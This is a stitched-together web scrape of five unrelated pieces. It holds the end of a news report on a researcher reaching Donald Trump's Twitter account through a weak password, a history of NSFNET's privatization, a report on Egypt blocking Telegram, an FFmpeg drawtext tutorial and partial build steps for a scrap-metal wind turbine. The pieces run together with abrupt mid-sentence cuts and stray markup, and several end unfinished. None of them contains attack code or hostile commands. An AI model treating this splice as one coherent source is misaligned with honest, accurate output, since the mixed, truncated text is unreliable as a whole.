verification. ‘But I didn’t get a reply.’</p><p data-element-id="f6ea-8910-66b0-bf9a-95b6-b615-5fea-8aaf">So, he tries to warn others. Trump’s campaign team, his family. He sends messages via Twitter asking if someone will call Trump’s attention to the fact that his Twitter account is not safe. He tags the CIA, the White House, the FBI, Twitter themselves. No response.</p><p data-element-id="aac2-5921-f32c-921b-6962-09da-fe3a-ed47">Gevers: ‘Then on Saturday, I suddenly saw that two-step verification for the account had been activated.’ Two days later, in the evening, he receives an email from the American Secret Service. ‘Friendly. They were interested in my information. I forwarded everything to them.’ On Tuesday they speak digitally. They thank Gevers, telling him that they were unaware of the security leak. This still leaves the security researcher with a number of questions: ‘Why is it possible for someone from a different time zone to log into such an important account? Why doesn’t Twitter demand better passwords? If I can access his account, then foreign nations can do so as well, right? Why aren’t the persons who are supposed to protect the President informed when someone reports that his account is unsafe?’</p><h3 data-element-id="6701-b1b1-7279-551d-015e-e20b-5efc-6540">Surprisingly easy</h3><p data-element-id="c0f4-6fcc-64af-62c3-2b8d-84c3-109f-6fac">Matthijs Koot, security researcher at Secura, is also astonished at how easy it was for Gevers to take over Trump’s account. ‘To put it harshly: people who in the year 2020 still ignore basic advice on online security are a potential danger to themselves and to those around them.’</p><p data-element-id="47c2-0c2c-b48f-fc57-7b10-7e05-6d7f-065f">According to Koot, these risks also affect others. ‘Today, we are increasingly interconnected, which means that a hack of one individual’s account or computer may also undermine the privacy and security of others. After all, via Trump’s account you can also see private messages sent to him or refer others to links containing malware or to a fake login page.’ This raises the question of how responsible Twitter is when it comes to additional security measures. Koot: ‘They should either compel people to use additional authentication or, if people really don’t want this, make them use a complex password. The days of logging in with just a weak password are over.’</p><p data-element-id="364a660b-32af-4ff8-b17b-8a49a27d61d8"><span>Twitter declines to respond to questions. The question remains why Trump was using such a weak and simple password. Gevers has a possible explanation: ‘Trump is over 70 – elderly people often switch off two-step verification because they find it too complicated. My own mother, for instance. For younger generations digital security is more self-evident.’</span></p></section></section></div>]]>

<p>In the summer of 1986, Senator Al Gore, Jr., of Tennessee introduced an amendment to the Congressional Act that authorized the&nbsp; budget of the National Science Foundation (NSF). He called for the federal government to study the possibilities for “communications networks for supercomputers at universities and Federal research facilities.” To explain the purpose of this legislation, Gore called on a striking analogy:&nbsp;</p>



<blockquote><p>One promising technology is the development of fiber optic systems for voice and data transmission. Eventually we will see a system of fiber optic systems being installed nationwide. America’s highways transport people and materials across the country. Federal freeways connect with state highways which connect in turn with county roads and city streets. T<em>o transport data and ideas,</em> <em>we will need a telecommunications highway connecting users coast to coast, state to state, city to city</em>. The study required in this amendment will identify the problems and opportunities the nation will face in establishing that highway.<sup>1</sup></p></blockquote>



<p>In the following years, Gore and his allies would call for the creation of an “information superhighway”, or, more formally, a national information infrastructure (NII). As he intended, Gore’s analogy to the federal highway system summons to mind a central exchange that would bind together various local and regional networks, letting all American citizens communicate with one another. However, the analogy also misleads – Gore did not propose the creation of a federally-funded and maintained data network. He envisioned that the information superhighway, unlike its concrete and asphalt namesake, would come into being through the action of market forces, within a regulatory framework that would ensure competition, guarantee open, equal access to any service provider (what would later be known as “net neutrality”), and provide subsidies or other mechanisms to ensure universal service to the least fortunate members of society, preventing the emergence of a gap between the information rich and information poor.<sup>2</sup></p>



<p>Over the following decade, Congress slowly developed a policy response to the growing importance of computer networks to the American research community, to education, and eventually to society as a whole. Congress’ slow march towards an NII policy, however, could not keep up with the rapidly growing NSFNET, overseen by the neighboring bureaucracy of the executive branch. Despite its reputation for sclerosis, bureaucracy was created exactly because of its capacity, unlike a legislature, to respond to events immediately, without deliberation. And so it happened that, between 1988 and 1993, the NSF crafted the policies that would determine how the Internet became private, and thus went public. It had to deal every year with novel demands and expectations from NSFNET’s users and peer networks. In response, it made decisions on the fly, decisions which rapidly outpaced Congressional plans for guiding the development of an information superhighway. These decisions rested largely in the hands of a single man – Stephen Wolff.</p>



<h2>Acceptable Use</h2>



<p>Wolff earned a Ph.D. in electrical engineering at Princeton in 1961 (where he would have been a rough contemporary of Bob Kahn), and began what might have been a comfortable academic career, with a post-doctoral stint at Imperial College, followed by several years teaching at Johns Hopkins. But then he shifted gears, and took a position&nbsp; at the Ballistics Research lab in Aberdeen, Maryland. He stayed there for most of the 1970s and early 1980s, researching communications and computing systems for the U.S. Army. He introduced Unix into the lab’s offices, and managed Aberdeen’s connection to the ARPANET.<sup>3</sup></p>



<p>In 1986, the NSF recruited him to manage the NSF’s supercomputing backbone – he was a natural fit, given his experience connecting Army supercomputers to ARPANET. He became the principal architect of NSFNET’s evolution from that point until his departure in 1994, when he entered the private sector as a manager for Cisco Systems. The original intended function of the net that Wolff was hired to manage had been to connect researchers across the U.S. to NSF-funded supercomputing centers. As we saw last time, however, once Wolff and the other network managers saw how much demand the initial backbone had engendered, they quickly developed a new vision of NSFNET, as a communications grid for the entire American research and post-secondary education community.</p>



<p>However, Wolff did not want the government to be in the business of supplying network services on a permanent basis. In his view, the NSF’s role was to prime the pump, creating the initial demand needed to get a commercial networking services sector off the ground. Once that happened, Wolff felt it would be improper for a government entity to be in competition with viable for-profit businesses. So he intended to get NSF out of the way by privatizing the network, handing over control of the backbone to unsubsidized private entities and letting the market take over.</p>



<p>This was very much in the spirit of the times. Across the Western world, and across most of the political spectrum, government leaders of the 1980s touted privatization and deregulation as the best means to unleash economic growth and innovation after the relative stagnation of the 1970s. As one example among many, around the same time that NSFNET was getting off the ground, the FCC knocked down several decades-old constraints on corporations involved in broadcasting. In 1985, it removed the restriction on owning print and broadcast media in the same locality, and two year later it nullified the fairness doctrine, which had required broadcasters to present multiple views on public-policy debates.&nbsp;</p>



<p>From his post at NSF, Wolff had several levers at hand for accomplishing his goals. The first lay in the interpretation and enforcement of the network’s acceptable use policy (AUP). In accordance with NSF’s mission, the initial policy for the NSFNET backbone, in effect until June 1990, required all uses of the network to be in support of “scientific research and other scholarly activities.” This is quite restrictive indeed, and would seem to eliminate any possibility of commercial use of the network. But Wolff chose to interpret the policy liberally. Regularly mailing list postings about new product releases from a corporation that sold data processing software – was that not in support of scientific research? What about the decision to allow MCI’s email system to connect to the backbone, at the urging of Vint Cerf, who had left government employ to oversee the development of MCI Mail. Wolff rationalized this – and other later interconnections to commercial email systems such as CompuServe’s – as in support of research by making it possible for researchers to communicate digitally with a wider range of people that they might need to contact in the pursuit of their work. A stretch, perhaps. But Wolff saw that allowing some commercial traffic on the same infrastructure that was used for public NSF traffic would encourage the private investment needed to support academic and educational use on a permanent basis.&nbsp;</p>



<p>Wolff’s strategy of opening the door of NSFNET as far as possible to commercial entities got an assist from Congress in 1992, when Congressman Rick Boucher, who helped oversee NSF as chair of the Science Subcommittee, sponsored an amendment to the NSF charter which authorized any additional uses of NSFNET that would “tend to increase the overall capabilities of the networks to support such research and education activities.” This was an<em> ex post facto </em>validation of Wolff’s approach to commercial traffic, allowing virtually any activity as long as it produced profits that encouraged more private investment into NSFNET and its peer networks.&nbsp;&nbsp;</p>



<h2>Dual-Use Networks</h2>



<p>Wolff also fostered the commercial development of networking by supporting the regional networks’ reuse of their networking hardware for commercial traffic. As you may recall, the NSF backbone linked together a variety of not-for-profit regional nets, from NYSERNet in New York to Sesquinet in Texas to BARRNet in northern California. NSF did not directly fund the regional networks, but it did subsidize them indirectly, via the money it provided to labs and universities to offset the costs of their connection to their neighborhood regional net. Several of the regional nets then used this same subsidized infrastructure to spin off a for-profit commercial enterprise, selling network access to the public over the very same wires used for the research and education purposes sponsored by NSF. Wolff encouraged them to do so, seeing this as yet another way to accelerate the transition of the nation’s research and education infrastructure to private control.&nbsp;</p>



<p>This, too, accorded neatly with the political spirit of the 1980s, which encouraged private enterprise to profit from public largesse, in the expectation that the public would benefit indirectly through economic growth. One can see parallels with the dual-use regional networks in the 1980 Bayh-Dole Act, which defaulted ownership of patents derived from government-funded research to the organization performing the work, not to the government that paid for it.&nbsp;</p>



<p>The most prominent example of dual-use in action was PSINet, a for-profit company initially founded as Performance Systems International in 1988. William Schrader and Martin Schoffstall, the co-founder of NYSERNet and one of vice presidents’, respectively, created the company. Schofstall, a former BBN engineer and co-author of the Simple Network Management Protocol (SNMP) for managing the devices on an IP network, was the key technical leader. Schrader, an ambitious Cornell biology major and MBA who had helped his <em>alma mater </em>set up its supercomputing center and get it connected to NSFNET, provided the business drive. He firmly believed that …</p></div></div>

<p>Technology and Law Community “Masaar” documented the blocking of the Telegram website and application by the Egyptian authorities on 22 October 2020. The authorities blocked Telegram on three of the Internet service networks operating in Egypt. These networks included “We”, “Vodafone” and “Orange”. Masaar learned about the blocking action after complaints from several users of the Internet services on the three networks, stating that they cannot access the application or the website. It should be noted that Telegram is one of the most popular and widespread encrypted chat applications in the world.</p>
<p>Masaar confirms that users of the three networks: We (AS8452), Orange (AS24863) and Vodafone (AS36935) cannot use Telegram application on smartphones, as the Egyptian authorities have blocked access to IP addresses of the application.</p>
<p>The authorities also have blocked the Telegram website itself (telegram.org) and the version of Telegram used for desktop computers (web.telegram.org). Further, the blocking involved ADSL and mobile internet (4G / 3G).</p>
<p>It is noteworthy that last September “Masaar” had <a href="https://masaar.net/en/blocked-websites-in-egypt/">published a web page declaring that the authorities have blocked 596 websites and 32 alternative links</a> since May 2017.</p>

<p>In order to use&nbsp;<code>drawtext</code>, you needed to have configured FFmpeg with&nbsp;<code>--enable-libfreetype</code>. As per the documentation, you need the following options as well if you want to,</p>



<ul><li>enable default font fallback and the font option you need to configure FFmpeg with&nbsp;<code>--enable-libfontconfig</code>.</li><li>enable the text_shaping option, you need to configure FFmpeg with&nbsp;<code>--enable-libfribidi</code>.</li></ul>

<p>The complete list of options for&nbsp;<code>drawtext</code>&nbsp;filter can be accessed&nbsp;<a href="https://ffmpeg.org/ffmpeg-filters.html#Syntax" target="_blank" rel="noopener">here</a>. It is far too much for me to explain here, but, if you have any questions, that is the first place you should refer.</p>



<p>In this article, I’ll walk through several common use-cases that should make the concepts easy to understand.</p>



<h2 id="display-text-on-the-video-using-drawtext-filter"><span id="Display_Text_on_the_Video_using_drawtext_filter"></span>Display Text on the Video using drawtext filter<span></span></h2>



<p>Here is the commandline and an explanation of the options</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='My text starting at 640x360':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Here,</p>



<ul><li><code>inputClip.mp4</code>&nbsp;is the input video on which you want to display the text; and the output (containing the text) is to be stored in&nbsp;<code>output.mp4</code></li><li>no audio re-encoding as indicated by&nbsp;<code>-c:a copy</code></li><li>we use the drawtext filter as indicated by the commands&nbsp;<code>-vf "drawtext=........"</code></li><li><code>text='My text starting at 640x360'</code>&nbsp;is the text that will be shown on the video (you could make it your name for watermarking the video, right?)</li><li>position of the text<ul><li><code>x=640:y=360</code>&nbsp;indicates that the x and y coordinates as&nbsp;<code>640px</code>&nbsp;and&nbsp;<code>360px</code>.

<p>A better way to this is to offset the text by the length of the text that you are printing on the screen.</p>



<p>Confused?</p>



<p>If you look at the image above, you’ll see that it starts at the center of the video and extends towards the right.</p>



<p><strong>If you want to center the text itself, then you can subtract the height and width of the rendered text when telling&nbsp;<code>drawtext</code>&nbsp;where to render the text.</strong></p>



<p>Here’s how. You use the command&nbsp;<code>x=(w-text_w)/2:y=(h-text_h)/2</code>&nbsp;and it will center the text. Here is our new commandline –</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='Centered Text':x=(w-text_w)/2:y=(h-text_h)/2:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Now, the text looks nice and pretty 🙂</p>

<p><strong>Fantastic – you now know how to overlay text onto a video using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter. Do you think you can add your own watermark or copyright? Let’s try 🙂</strong></p>

<p>Let’s modify the command as follows to indicate my name and the copyright symbol.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>This produces an output like this – looks good right? You can play around with the&nbsp;<code>x</code>&nbsp;and&nbsp;<code>y</code>&nbsp;coordinates to align the text the way you want to.</p>

<h2 id="adding-text-with-background-color-using-ffmpegs-drawtext-filter"><span id="Adding_Text_with_Background_Color_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding Text with Background Color using FFmpeg’s drawtext filter<span></span></h2>



<p>To add a background color, we need</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=(1100-text_w):y=(600-text_h):fontsize=32:fontcolor=black:box=1:boxcolor=white@0.5: boxborderw=5" -c:a copy output.mp4</code></pre>



<p>The new commands here are –</p>



<ul><li><code>box</code>&nbsp;: this is either&nbsp;<code>1</code>&nbsp;(enabled) or&nbsp;<code>0</code>&nbsp;(disabled)</li><li><code>boxcolor:&nbsp;white@0.5</code>&nbsp;implies a white colored box with a 50% opacity.</li><li><code>boxborderw</code>&nbsp;is the width of the box’s border and the border color is taken from&nbsp;<code>boxcolor</code>.</li></ul>



<p>And there you have it, text with a background. In this example, I switched the color of the text to black so that it contrasts well with a light background bounding box (which in-turn contrasts well with a dark background.)</p>

<h2 id="displaying-timecodes--timestamps-using--ffmpegs-drawtext-filter"><span id="Displaying_TimeCodes_/_TimeStamps_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Displaying TimeCodes / TimeStamps using FFmpeg’s drawtext filter<span></span></h2>



<p>This is a very useful application of the&nbsp;<code>drawtext</code>&nbsp;filter and is used in demonstrating low-latency applications or visual quality testing so that one knows precisely what the timestamps/timecodes are at each time.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: hms}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4</code></pre>



<p>This uses the&nbsp;<code>timestamp</code>&nbsp;and&nbsp;<code>pts</code>&nbsp;options to display time in hour:min:sec format using the&nbsp;<code>hms</code>&nbsp;format specifier. The notations and formatting are complex in my opion! So, a lot of trial and error might be needed before you format your display correctly.</p>



<p>Here is how the video looks. Hope Vimeo shows you the video without a lot of delay 🙂</p>



<figure><div>
<p><iframe width="600" height="338" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen="" data-src="https://player.vimeo.com/video/445270549" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>
</div></figure>



<p>And here is the same command, but using the&nbsp;<code>flt</code>&nbsp;option to provide microsecond time accuracy! Fancy 🙂</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: flt}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4

<h2 id="display-movie-credits-using-ffmpegs-drawtext-filter"><span id="Display_Movie_Credits_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Display Movie Credits using FFmpeg’s drawtext filter<span></span></h2>



<p>Finally, let’s learn how to show a movie’s credits using the draw text filter. Here are two main concepts that you need to understand.</p>



<ul><li>providing a lot of text: you can’t do this via the commandline, so, you need to read a text file that contains the text. And you can read that using the&nbsp;<code>textfile</code>&nbsp;option.</li><li>and, specify the speed of scrolling using the&nbsp;<code>y</code>&nbsp;text position. Here, you can provide an equation instead of a constant number. You start off by telling by FFmpeg that the y-position is&nbsp;<code>h - 80*t</code>&nbsp;so that everytime the value of time increases, the value of&nbsp;<code>h - 80*t*</code>&nbsp;decreases, and the text is displayed higher. Makes sense?</li></ul>



<p><strong>Tip: change&nbsp;<code>80</code>&nbsp;to&nbsp;<code>100</code>&nbsp;or&nbsp;<code>120</code>&nbsp;and see the effect on the scrolling speed.</strong></p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=textfile=credits.txt: x=200: y=h-80*t: fontsize=36:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy outputCredits.mp4
</code></pre>



<p>Here is the output:</p>



<figure><div>

<p>That’s it for this tutorial on using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter to produce dynamic overlays on your videos. It is a very versatile and handy tool that you can use to overlay text, timecodes, credits, copyrights notices on your videos.</p>

<p><strong><a name="desc" id="desc"></a>Description:</strong></p><p>

  This is a Vertical Axis Wind Turbine which uses wind energy to  drive things like an alternator/generator for producing electricity,  or air and water pumps for cooling, irrigation and similar.<br>
  The  turbine uses the 35-40% mechanically efficient Lenz2 lift+drag  design. It is made almost entirely from scrap materials, and should  cost about $15-$30 for the six vane version, which can be made by two  people in four hours without much effort. <br>
The three vane  version has been successfully survival tested to 80 km/h sustained  winds and the six vane version to 105 km. Both will do more, but  exactly how much has not yet been ascertained. The current longest  running version has been up since early 2014, through reasonable  storms, with no noticeable wear and tear as of yet.</p>

<p>Full power curves have yet to be calculated for this  particular build, but according to Mr Ed Lenz's calculations a six  vane at 0.91 meters diameter and 1.1 meters high with a 90% efficient  alternator should produce at least 130 watts of electricity in a 30  km/h wind, and 1 kilowatt at 60 km/h. </p><p>
The materials  listed in this tutorial are to make the three vane version. Double  everything except the bike wheel for six vanes.

              </strong>Exactly how  bike wheels are measured is slightly complicated, basically you want  one which is about 58cm total outer rim diameter, give or take. <br>
              The  wheel should:<br>
              ~ Not be quick release <br>
              ~ Have a normal thick  axle (about 10mm diameter)<br>
              ~ Have 36 spokes<br>
              ~ Run reasonably  smoothly <br>
              ~ Have enough axle showing to attach to your pole  mount, at least 3-4cm.<br>
            ~ Only needs gears if you're going to be running a chain off them, which you probably aren't.</p>              <p>It may be helpful to take the wheel  hub apart using spanners and a bike cone spanner and give the  bearings a bit of a clean and re-grease, and to extend the axle as  much as possible on one side for attaching. If you've not done this  before take it along to your local bike servicing place and they'll  be happy to show you how. Shouldn't be necessary tho if the wheel  runs nicely enough and has enough axle showing.</p></td>

<p><a name="steps" id="steps"></a>
<strong>Step by step build instructions:</strong></p>
<p>These relate to the animation to the left. </p>
<p><strong>Step 1:</strong><br>
  Download and print the two template  files from the links above. Make sure they're printed at 100% (200  dpi). When printed measure the distance between the dimension arrows,  it should be 10cm on both pages. If it's a couple mm off that's  probably ok.</p>
<p>Tape the pages together so that the 10cm dimension marks overlap  as closely as possible. Best way to do this is on a window pane  during the day, so you can see both pages showing through.<br>
  With  a craft knife and the angle aluminium as a straight edge, cut out the  outer border of the template.<br>
  Any time you're cutting, always  make sure your other hand is never in front of the knife, so if you  slip you're not going to slice yourself. The angle aluminium is good  for this, as the vertical bit effectively shields the hand holding  it.</p>
<p><strong>2</strong><strong>:</strong><br>
  Take an aluminium sheet  and measure a box 42cm x 48cm. Draw a line half way up the 48cm  length so you have two boxes measuring 42cm x 24cm. Score the outer  lines with the Stanley knife and straight edge. You're not trying to  cut through the metal, just create a line that can then be popped out  later. A good method is to score once lightly, then a second time a  bit deeper.<br>
  Do not score the 24cm halfway line.</p>
<p>Flex the metal so that it bends at a score line, then flex back  the other way. Do this a couple times and it should split. Do the  same for the other score and remove the outer metal. Keep it for  later. </p>
<p><strong>3</strong><strong>:</strong><br>
  Tape the template to the  metal rectangle (from now on to be referred to as a 'former') so that  the long edge of the paper sits on the middle line and the right hand  edges of both line up. Don't worry if the other edges don't align  perfectly.</p>
<p>With blade and straight edge, score out the template curve,  including the triangles at each end. It's not essential that this be  100% perfect, but try to get the first one reasonably nice as you can  then use it as a template for the rest.</p>
<p>Score, flex, and remove the two triangles of metal outside the  template.</p>
<p><strong>4</strong><strong>:</strong><br>
  Mark the centers of the  little circles on the paper template with a marker pen so that  they're visible from the other side and flip the paper over so that  the printed side is down on the other half of the former, keeping the  long edge on the middle line. Retape so it doesn't shift.<br>
  Give  the curved score a couple of flexes and tear it out. Remove the two  small triangles. Be careful not to bend the unscored metal too much  as you're doing this as it may weaken it.</p>
<p>You now have your first former. Repeat steps 2 through 3 so that  you have a total of 6 formers. You can use the first former as a  cutting template rather than the paper. On three of the formers have  the 24cm line drawn on the front, the other three on the back.</p>
<p><strong>5</strong><strong>:</strong><br>
  Take all six formers and peg them together  so that they are as nicely aligned as possible.<br>
  Use tape to  attach them if you don't have clothes pegs. </p>
<p>Drill each of the 16 holes through all six formers with a 4mm bit.  Drill the center hole first, as this is the only one that needs to be  reasonably accurate. It can help to put a bolt through that first  hole to keep the formers from shifting around as you drill.</p>
<p>If the holes on your template are laid out a little differently  than those in the animation it'll be because the template is more  up to date.</p>
<p>Remove the template and unpeg the formers.<br>
  Place a former  with the 24cm line slightly overhanging the edge of the table. Place  the straight edge on the middle line and bend up to 90 degrees.  Repeat with all six, with three formers bent shiny side up and three  bent shiny side down. <br>
  Put the formers aside. </p>
<p><strong>6</strong><strong>:</strong><br>
  Take an aluminium sheet  and flatten out any bends in the metal. Cut the long edge down to  67cm.</p>
<p>Draw a line 2cm from one of the 67cm edges, flip the sheet over  and draw another line 2cm from the opposite edge on the other side of  the metal.</p>
<p>repeat with 2 more sheets and peg all 3 together so that each  drawn line is aligned to the edge of the sheet above it.</p>
<p>Mark the edge at 4cm, 6, 8, 10, 18, 26, 34, and then every 2cm up  to and including 64cm<br>
  Keep in mind that one side has a score at  4cm from the edge, the other at 3cm.</p>
<p>Flip the sheets over, making sure they don't lose their alignment.  Mark and score the same as the first edge. Make sure both have the  4cm gap on the same edge.</p>
<p><strong>7</strong><strong>:</strong><br>
  Tap the sheets on the  table so that they are aligned on top of each other.<br>
  From the  4cm end draw a vertical line at 19cm from the edge, and one at 33cm  from the edge.<br>
  Mark each line at 3cm and 20cm from both ends.</p>
<p>Drill all 3 sheets with 4mm holes at all 8 marks. If you're  making a six vane turbine rather than three you can drill all six  sheets at once as easily.<br>
  Unpeg the sheets.</p>
<p><strong>8:</strong><br>
  Place a sheet so that the second 3cm edge is  overhanging the table. Place the straight edge on …</p></div></div></div>
